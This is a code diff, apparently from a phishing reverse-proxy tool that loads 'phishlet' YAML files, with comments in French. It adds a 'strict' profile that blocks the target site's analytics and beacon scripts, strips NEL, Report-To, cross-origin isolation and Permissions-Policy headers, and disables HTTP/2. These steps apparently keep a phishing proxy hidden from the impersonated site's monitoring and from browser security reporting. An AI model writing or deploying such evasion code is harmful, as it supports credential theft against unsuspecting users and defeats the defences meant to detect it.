@@ -168,7 +168,8 @@ def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2,
         with open(path, "r") as f:
             ph_yaml = f.read()
         # Appliquer profil
-        if profile and profile.lower() == "stealth":
+        p = (profile or "default").lower()
+        if p == "stealth":
             try:
                 data = yaml.safe_load(ph_yaml)
                 if not isinstance(data, dict):
@@ -196,6 +197,38 @@ def edge_run(name, path, host, port, upstream, rate, allow_ips, deny_ips, http2,
                     os.environ["RATE_LIMIT_PER_MINUTE"] = "60"
             except Exception as e:
                 console.print(f"[yellow]Profil stealth non appliqué: {e}[/yellow]")
+        elif p == "strict":
+            try:
+                data = yaml.safe_load(ph_yaml)
+                if not isinstance(data, dict):
+                    raise ValueError("phishlet YAML invalide")
+                bl = data.get("blocklist") or []
+                extra_bl = [
+                    {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript","application/javascript"], "max_kb": 256},
+                    {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 160},
+                    {"pattern": "/video|/media|/stream", "mimes": ["video/"], "max_kb": 400},
+                    {"pattern": "/images|/img|/static/", "mimes": ["image/"], "max_kb": 150},
+                ]
+                bl.extend(extra_bl)
+                data["blocklist"] = bl
+                # En-têtes à retirer
+                hdrs = data.get("headers") or []
+                hdrs.extend([
+                    {"action": "remove", "name": "NEL"},
+                    {"action": "remove", "name": "Report-To"},
+                    {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
+                    {"action": "remove", "name": "Cross-Origin-Embedder-Policy"},
+                    {"action": "remove", "name": "Cross-Origin-Resource-Policy"},
+                    {"action": "remove", "name": "Permissions-Policy"},
+                ])
+                data["headers"] = hdrs
+                ph_yaml = yaml.safe_dump(data, sort_keys=False)
+                # HTTP/2 off et limite plus basse
+                cfg.http2 = False
+                if rate is None:
+                    os.environ["RATE_LIMIT_PER_MINUTE"] = "40"
+            except Exception as e:
+                console.print(f"[yellow]Profil strict non appliqué: {e}[/yellow]")
         # Environnement réseau
         if rate is not None:
             os.environ["RATE_LIMIT_PER_MINUTE"] = str(rate)
